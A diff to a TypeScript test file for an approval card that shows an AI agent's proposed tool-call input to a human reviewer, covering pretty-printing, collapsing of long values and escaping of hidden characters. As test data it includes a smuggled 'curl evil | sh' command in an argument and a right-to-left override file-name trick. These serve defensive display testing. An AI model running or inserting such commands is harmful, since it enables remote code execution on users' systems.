@@ -171,7 +171,7 @@ const FULL: ApprovalView = {
   session: 'session-id',
   client: 'client-id',
   installation: 'installation-name',
-  canonicalArguments: 'canonical-arguments',
+  canonicalArguments: `{"arg-key":"arg-value","arg-long":${LONG}}`,
   argumentsHash: 'arguments-hash',
   expiresAt: new Date(Date.now() + 4.5 * 60_000).toISOString(),
   digest: 'digest-1',
@@ -191,6 +191,10 @@ const NOT_RENDERED_AS_IS: Record<string, string> = {
   changesData: 'shown as the Changes data tag',
   'steps.0.asks': 'shown as the Asks tag',
   'steps.0.id': "the step's key; its label and tool name it",
+  'arguments.0.label': 'the Input block shows the canonical arguments as one',
+  'arguments.0.type': 'the Input block shows the canonical arguments as one',
+  'arguments.1.label': 'the Input block shows the canonical arguments as one',
+  'arguments.1.type': 'the Input block shows the canonical arguments as one',
 };
 
 function leaves(value: unknown, path = ''): Array<[string, string]> {
@@ -292,19 +296,84 @@ describe('InlineApproval card', () => {
     ).toHaveTextContent('"step-arg-value ; curl evil | sh" (string)');
   });
 
-  it('never cuts a long value: it is collapsed with Show all and a hidden-characters marker, and Approve is active after the delay without opening it', async () => {
+  const inputOf = (canonicalArguments: string) =>
+    approvalsFor({ ...FULL, canonicalArguments });
+  const inputBlock = async () =>
+    (await screen.findByTestId('approval-input')).querySelector('pre')!;
+
+  it('shows the input as one pretty-printed block, nested objects and arrays included', async () => {
+    await renderCard(inputOf('{"a":{"b":[1,{"c":null}],"d":[]},"e":true}'));
+    expect(await screen.findByText('Input:')).toBeVisible();
+    expect((await inputBlock()).textContent).toBe(
+      [
+        '{',
+        '  "a": {',
+        '    "b": [',
+        '      1,',
+        '      {',
+        '        "c": null',
+        '      }',
+        '    ],',
+        '    "d": []',
+        '  },',
+        '  "e": true',
+        '}',
+      ].join('\n'),
+    );
+  });
+
+  it('breaks a multi-line string value into lines, keeping its \\n and its quotes escaped', async () => {
+    await renderCard(
+      inputOf(String.raw`{"script":"echo hi\n  \"admin\": true"}`),
+    );
+    const block = await inputBlock();
+    expect(block.textContent).toBe(
+      [
+        '{',
+        String.raw`  "script": "echo hi\n`,
+        String.raw`  \"admin\": true"`,
+        '}',
+      ].join('\n'),
+    );
+    // The continuation is shaded as the same string value, not shown as a
+    // key of its own.
+    const continuation = Array.from(block.querySelectorAll('span')).find(
+      span => span.textContent === String.raw`  \"admin\": true"`,
+    );
+    expect(continuation?.className).toMatch(/string/);
+    expect(continuation?.className).not.toMatch(/key/);
+  });
+
+  it('says Input: none without arguments', async () => {
+    await renderCard(inputOf('{}'));
+    expect(await screen.findByTestId('approval-input')).toHaveTextContent(
+      'Input: none',
+    );
+    expect(
+      screen.getByTestId('approval-input').querySelector('pre'),
+    ).toBeNull();
+  });
+
+  it('keeps marked characters as muster marked them', async () => {
+    await renderCard(inputOf('{"name":"evil⟨U+202E⟩txt","nul":"a\\u0000b"}'));
+    const text = (await inputBlock()).textContent;
+    expect(text).toContain('"evil⟨U+202E⟩txt"');
+    expect(text).toContain(String.raw`"a\u0000b"`);
+  });
+
+  it('never cuts a long input: it is collapsed with Show all and a hidden-characters marker, and Approve is active after the delay without opening it', async () => {
     const user = userEvent.setup();
-    const approvals = approvalsFor(FULL);
+    const approvals = inputOf(`{"arg-long":"${'y'.repeat(700)}"}`);
     await renderCard(approvals);
-    const long = await screen.findByTestId('approval-argument-arg-long');
-    expect(long).toHaveTextContent('Show all 402 characters');
-    expect(long).toHaveTextContent('342 characters hidden');
-    expect(long).toHaveTextContent('y'.repeat(400));
-    expect(long.querySelector('details')).not.toHaveAttribute('open');
+    const input = await screen.findByTestId('approval-input');
+    expect(input).toHaveTextContent('Show all 720 characters');
+    expect(input).toHaveTextContent('(420 characters hidden)');
+    expect(input).toHaveTextContent('y'.repeat(700));
+    expect(input.querySelector('details')).not.toHaveAttribute('open');
 
     await waitFor(() => expect(approve()).toBeEnabled());
     expect(decline()).toBeEnabled();
-    expect(long.querySelector('details')).not.toHaveAttribute('open');
+    expect(input.querySelector('details')).not.toHaveAttribute('open');
     await user.click(approve());
     expect(approvals.decide).toHaveBeenCalledWith(
       'https://muster.example.io/approvals/a',
@@ -381,7 +450,7 @@ describe('InlineApproval card', () => {
     // asks and expiry.
     expect(screen.getByTestId('approval-connector')).toBeVisible();
     expect(screen.getByTestId('approval-tool')).toBeVisible();
-    expect(screen.getByTestId('approval-argument-arg-long')).toBeVisible();
+    expect(screen.getByTestId('approval-input')).toBeVisible();
     expect(screen.getByTestId('approval-agent-says')).toBeVisible();
     expect(screen.getByTestId('approval-why')).toBeVisible();
     // About this request and the canonical arguments are not there yet.
@@ -394,7 +463,7 @@ describe('InlineApproval card', () => {
     ]) {
       expect(screen.queryByTestId(id)).not.toBeInTheDocument();
     }
-    expect(screen.queryByText('canonical-arguments')).not.toBeInTheDocument();
+    expect(screen.queryByText(FULL.canonicalArguments)).not.toBeInTheDocument();
     const toggle = screen.getByRole('button', { name: 'Show details' });
     expect(toggle).toHaveAttribute('aria-expanded', 'false');
 
@@ -405,7 +474,7 @@ describe('InlineApproval card', () => {
     );
     expect(screen.getByTestId('approval-session')).toBeVisible();
     expect(screen.getByTestId('approval-client')).toBeVisible();
-    expect(screen.getByText('canonical-arguments')).toBeVisible();
+    expect(screen.getByText(FULL.canonicalArguments)).toBeVisible();
     const hide = screen.getByRole('button', { name: 'Hide details' });
     expect(hide).toHaveAttribute('aria-expanded', 'true');
     await user.click(hide);
